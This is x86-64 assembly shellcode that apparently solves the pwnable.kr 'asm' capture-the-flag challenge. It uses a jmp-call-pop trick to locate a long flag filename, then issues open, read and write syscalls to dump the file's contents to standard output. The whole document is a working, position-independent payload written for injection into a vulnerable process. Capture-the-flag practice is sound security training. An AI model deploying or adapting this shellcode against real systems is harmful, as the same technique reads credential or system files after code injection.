section .text
    global _start

_start:
    push rax
    push rdi
    push rsi
    push rdx
    push rsp
    push rbp

    ; open the file
    mov rbp, rsp
    xor rax, rax
    mov al, 2 ; syscall number for open 
    ; lea rdi, [rel filename + 0x01010101] ; pointer to the filename  
    ; sub rdi, 0x01010101    
   jmp short data ; jump to the next instruction
previous:
    pop rdi ; pop the return address into rdi
    ; adjust rdi to point to the filename
    ; lea rdi, [rip+filename/] ; pointer to the filename      
    xor rsi, rsi ; flags
    xor rdx, rdx ; mode 
    syscall ; make the system call

    ; read from the file
    mov rdi, rax ; file descriptor for the file
    xor rax, rax ; syscall number for read
    sub rsp, 64 ; make room for the buffer
    mov rsi, rsp ; buffer
    xor rdx, rdx ; number of bytes to read
    push 64
    pop rdx
    syscall ; make the system call

    ; write to standard output
    xor eax, eax
    inc eax ; syscall number for write
    xor edi, edi
    inc edi ; file descriptor for stdout
    mov rsi, rsp ; buffer
    ; rdx still contains the number of bytes to write
    syscall ; make the system call

    ; add rsp, 100 ; restore the stack pointer
    mov rsp, rbp ; restore the stack pointer
    pop rbp
    pop rsp
    pop rdx
    pop rsi
    pop rdi
    pop rax
    ret
    
; section .data
data:
    call previous ; push the addr
filename:    db  "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong", 0
; null :       db  0
.len:   equ $ - filename